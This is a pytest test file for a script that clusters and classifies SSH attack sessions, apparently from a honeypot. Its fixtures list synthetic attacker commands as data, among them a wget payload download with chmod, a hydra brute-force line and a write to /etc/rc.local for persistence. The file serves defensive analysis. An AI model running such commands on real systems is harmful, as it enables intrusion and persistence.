from pathlib import Path
import sys

import pandas as pd
import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import scripts.behaviour_pattern_analysis as bpa


@pytest.fixture
def synthetic_dec_df():
    return pd.DataFrame(
        [
            {"session_id": "s1", "dec_cluster": 0, "dur": 5.0, "spkts": 1, "dpkts": 2, "service": "ssh"},
            {"session_id": "s2", "dec_cluster": 0, "dur": 7.0, "spkts": 1, "dpkts": 2, "service": "ssh"},
            {"session_id": "s3", "dec_cluster": 1, "dur": 10.0, "spkts": 10, "dpkts": 5, "service": "ssh"},
            {"session_id": "s4", "dec_cluster": 1, "dur": 12.0, "spkts": 12, "dpkts": 6, "service": "ssh"},
            {"session_id": "s5", "dec_cluster": 2, "dur": 8.0, "spkts": 5, "dpkts": 9, "service": "ssh"},
        ]
    )


@pytest.fixture
def synthetic_mapping_df():
    return pd.DataFrame(
        [
            {"session_id": "s1", "src_ip": "1.1.1.1", "src_port": 22},
            {"session_id": "s2", "src_ip": "1.1.1.2", "src_port": 22},
            {"session_id": "s3", "src_ip": "1.1.1.3", "src_port": 22},
            {"session_id": "s4", "src_ip": "1.1.1.4", "src_port": 22},
            {"session_id": "s5", "src_ip": "1.1.1.5", "src_port": 22},
        ]
    )


@pytest.fixture
def synthetic_session_details():
    return {
        "s1": {"auth_success": 0, "commands": ["whoami", "ls", "uname -a"], "session_duration": 5.0},
        "s2": {"auth_success": 1, "commands": ["wget http://example.com/payload.sh", "chmod +x payload.sh"], "session_duration": 7.0},
        "s3": {"auth_success": 0, "commands": ["hydra -l root -P pass.txt ssh://host", "sudo -n id"], "session_duration": 10.0},
        "s4": {"auth_success": 0, "commands": ["crontab -l", "echo evil >> /etc/rc.local"], "session_duration": 12.0},
        "s5": {"auth_success": 1, "commands": ["ls", "pwd"], "session_duration": 8.0},
    }


def test_calculate_cluster_distribution(synthetic_dec_df):
    dist = bpa.calculate_cluster_distribution(synthetic_dec_df)
    assert list(dist["cluster_id"]) == [0, 1, 2]
    assert dist["session_count"].tolist() == [2, 2, 1]
    assert abs(float(dist["percentage_of_sessions"].sum()) - 100.0) < 1e-9


def test_compute_cluster_feature_statistics(synthetic_dec_df):
    stats = bpa.compute_cluster_feature_statistics(synthetic_dec_df)
    assert {"cluster_id", "feature_name", "mean", "median", "std", "min", "max"}.issubset(stats.columns)
    assert any(stats["feature_name"] == "dur")
    assert stats[stats["cluster_id"] == 0].shape[0] >= 1


def test_classify_command_detection():
    assert "reconnaissance" in bpa.classify_command("whoami")
    assert "file_transfer" in bpa.classify_command("wget http://example.com/file.sh")
    assert "persistence" in bpa.classify_command("crontab -l")


def test_infer_session_interpretation_requires_evidence():
    assert bpa.infer_session_interpretation({"auth_success": 0}, [], 0) in {"Credential-attack behaviour", "Mixed/Unclassified"}
    assert bpa.infer_session_interpretation({}, [], None) == "Insufficient Evidence"


def test_validate_join_consistency_detects_missing_and_duplicates(synthetic_dec_df, synthetic_mapping_df, synthetic_session_details):
    dec_df = pd.concat(
        [
            synthetic_dec_df,
            pd.DataFrame([{"session_id": "s1", "dec_cluster": 0, "dur": 1.0, "spkts": 1, "dpkts": 1, "service": "ssh"}]),
        ],
        ignore_index=True,
    )
    mapping_df = pd.concat([synthetic_mapping_df, pd.DataFrame([{"session_id": "s6", "src_ip": "1.1.1.6", "src_port": 22}])], ignore_index=True)
    validation = bpa.validate_join_consistency(dec_df, mapping_df, synthetic_session_details)
    assert "s6" in validation["missing_in_dec"]
    assert len(validation["duplicate_dec_sessions"]) >= 1


def test_build_session_profiles_creates_interpretations(synthetic_dec_df, synthetic_session_details):
    profiles, _ = bpa.build_session_profiles(synthetic_dec_df, synthetic_session_details, {"duplicate_dec_sessions": [], "missing_in_mapping": [], "missing_in_session_details": []})
    assert "session_id" in profiles.columns
    assert "behavioural_interpretation" in profiles.columns
    assert profiles["behavioural_interpretation"].notna().all()


def test_loaders_validate_required_columns(tmp_path):
    dec_path = tmp_path / "dec_results.csv"
    pd.DataFrame([{"session_id": "s1"}]).to_csv(dec_path, index=False)
    with pytest.raises(bpa.AnalysisError):
        bpa.load_dec_results(dec_path)

    mapping_path = tmp_path / "session_mapping.csv"
    pd.DataFrame([{"other": "x"}]).to_csv(mapping_path, index=False)
    with pytest.raises(bpa.AnalysisError):
        bpa.load_session_mapping(mapping_path)

    details_path = tmp_path / "session_details.json"
    details_path.write_text("[]", encoding="utf-8")
    with pytest.raises(bpa.AnalysisError):
        bpa.load_session_details(details_path)
